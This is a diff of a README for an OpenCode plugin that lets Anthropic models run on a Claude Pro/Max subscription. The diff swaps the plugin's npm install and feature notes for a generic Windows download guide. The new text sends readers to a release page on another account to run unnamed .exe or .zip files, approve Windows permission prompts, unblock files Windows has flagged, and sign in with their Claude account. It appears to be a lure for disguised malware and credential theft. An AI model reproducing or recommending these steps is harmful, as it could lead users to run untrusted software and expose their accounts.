@@ -1,61 +1,160 @@
-# OpenCode Anthropic Auth
+# 🤖 opencode-anthropic-login-via-cli - Use Claude Pro and Max in OpenCode
 
-[OpenCode](https://github.com/sst/opencode) plugin that lets you use Anthropic models with your Claude Pro/Max subscription. No API key required.
+[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases)
 
-## Features
+## 🧩 What this is
 
-### Binary Introspection
+opencode-anthropic-login-via-cli is a small plugin for OpenCode. It lets you use Anthropic models with your Claude Pro or Max subscription from the command line.
 
-Reads the Claude CLI binary to extract current beta headers, OAuth scopes, and version info. Stays in sync with Anthropic's API automatically instead of relying on hardcoded values.
+It is made for Windows users who want a simple setup and want to start using the app with a few steps.
 
-### Cross-Platform Support
+## 📥 Download
 
-Works on **macOS**, **Linux**, and **Windows**.
+Visit this page to download the latest release:
 
-### Auto Login
+https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases
 
-If you have Claude CLI installed and logged in, the plugin picks up your credentials automatically:
+On that page, look for the newest release at the top. Open it and download the Windows file that matches your computer.
 
-- **macOS**: System Keychain
-- **Linux / Windows**: `~/.claude/.credentials.json`
+## 🪟 Windows setup
 
-### CCS Support
+### 1. Download the file
 
-If you use [CCS](https://github.com/kaitranntt/ccs) for multiple Claude Code instances, each instance in `~/.ccs/instances/` is detected and shows up as a separate auth method.
+Open the release page and download the Windows version from the Assets list.
 
-### Browser Login
+If you see a file such as `.exe`, `.zip`, or `.msi`, download the one meant for Windows.
 
-Opens an OAuth flow through `claude.ai` for users without the CLI. Log in, paste the code, done.
+### 2. Open the downloaded file
 
-### Token Refresh
+If you downloaded an `.exe` file, double-click it to start the app.
 
-Handles expired tokens automatically. Falls back to the CLI if the standard refresh fails.
+If you downloaded a `.zip` file, right-click it and choose Extract All, then open the extracted folder and launch the program inside.
 
-### Request Patching
+If Windows asks for permission, choose Yes so the app can run.
 
-Patches requests so OpenCode talks to Anthropic's API the same way Claude Code does.
+### 3. Sign in with your Claude account
 
-## Install
+When the app starts, follow the on-screen steps to log in with your Claude Pro or Max account.
 
-Add to your `opencode.json`:
+Use the same account that has the subscription you want to use with OpenCode.
 
-```json
-{
-  "plugin": ["opencode-anthropic-login-via-cli@latest"]
-}
-```
+### 4. Connect OpenCode
 
-Then open OpenCode and go to **Connect Provider > Anthropic**.
+After login, OpenCode can use Anthropic models through your subscription.
 
-## Auth Methods
+If the app asks for an OpenCode path, choose the OpenCode install location on your computer.
 
-| Method  | Label                    | How it works                                            |
-| ------- | ------------------------ | ------------------------------------------------------- |
-| Auto    | Claude Code (auto)       | Reads existing CLI credentials from Keychain/filesystem |
-| CCS     | CCS (_instance-name_)    | Auto-detects each CCS instance in `~/.ccs/instances/`   |
-| Browser | Claude Pro/Max (browser) | OAuth flow via claude.ai with PKCE                      |
-| API Key | API Key (manual)         | Standard Anthropic API key                              |
+If it asks for a browser sign-in, complete the login in your browser, then return to the app.
 
-## License
+## 🖥️ System requirements
 
-MIT
+This app is meant for Windows desktop computers.
+
+Recommended setup:
+
+- Windows 10 or Windows 11
+- A stable internet connection
+- A modern browser such as Chrome, Edge, or Firefox
+- A Claude Pro or Max subscription
+- Enough free space to download and extract the release file
+
+## 🔐 What the plugin does
+
+This plugin helps OpenCode use Anthropic models through your Claude subscription.
+
+It is useful if you want:
+
+- Access to Anthropic models from OpenCode
+- A simple login flow from the command line
+- A setup that works with your existing Claude Pro or Max plan
+- A local tool that fits a Windows workflow
+
+## 🧭 How to use it
+
+1. Start the app you downloaded
+2. Sign in with your Claude account
+3. Finish the login step in your browser if prompted
+4. Open OpenCode
+5. Select the Anthropic model or login option inside OpenCode
+6. Begin your work
+
+If the login does not finish right away, close the app and open it again, then try the same steps
+
+## 🛠️ Common file types
+
+You may see different file types on the release page:
+
+- `.exe` — a Windows app file. Double-click it to run
+- `.zip` — a compressed file. Extract it first
+- `.msi` — a Windows installer. Double-click it to install
+- `.txt` or `.md` — read this file for extra setup details
+
+## 🧰 If Windows blocks the app
+
+Sometimes Windows shows a message when you open a new file from the internet.
+
+If that happens:
+
+1. Right-click the file
+2. Choose Properties
+3. Look for an Unblock option
+4. Select it if you see it
+5. Click Apply
+6. Open the file again
+
+If you still cannot open it, download the file again from the release page and try once more
+
+## 🧪 Basic check
+
+After setup, confirm that:
+
+- The app opens without errors
+- You can sign in with your Claude account
+- OpenCode can see the Anthropic login option
+- A model request starts as expected
+
+If one step fails, close both the app and OpenCode, then open them again
+
+## 📂 Where to get updates
+
+Use the same release page to check for new versions:
+
+https://github.com/yashthecoolbro/opencode-anthropic-login-via-cli/releases
+
+When a newer release appears, download that version and repeat the same setup steps
+
+## 🧾 File names to look for
+
+Release pages can use different names for Windows files. Look for names that suggest:
+
+- Windows
+- win
+- x64
+- setup
+- installer
+- release
+
+If there are several files, choose the one that matches your system and is meant for Windows
+
+## 🔄 Typical first-time flow
+
+1. Visit the release page
+2. Download the Windows release file
+3. Open the file or extract it
+4. Sign in with Claude Pro or Max
+5. Open OpenCode
+6. Use Anthropic models inside OpenCode
+
+## 🧩 Short troubleshooting list
+
+- Download did not start: refresh the release page and try the latest asset
+- File does not open: check if it is a `.zip` file and extract it first
+- Login page does not load: try another browser
+- OpenCode does not detect the plugin: restart OpenCode
+- App closes right away: download the file again from the latest release
+
+## 📌 What to expect
+
+This tool is built for people who want a direct way to use Anthropic models in OpenCode with their existing Claude subscription.
+
+The setup is kept simple, with a release download, a login step, and a short connect process inside OpenCode
